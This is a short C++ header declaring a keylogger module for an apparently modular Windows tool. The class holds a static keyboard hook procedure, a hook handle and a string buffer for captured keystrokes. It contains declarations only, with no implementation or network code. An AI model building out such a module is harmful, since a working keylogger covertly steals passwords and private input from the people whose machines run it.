#pragma once
#include "ModuleInterface.h"
#include <windows.h>
#include <string>

class KeyloggerModule : public IModule {
public:
    KeyloggerModule();
    ~KeyloggerModule() override;

    ModuleInfo GetInfo() const override;
    bool Initialize() override;
    ModuleResult Execute(const std::vector<uint8_t>& params) override;
    void Cleanup() override;

private:
    static LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam);
    static std::string keyLog_;
    static HHOOK hHook_;
};
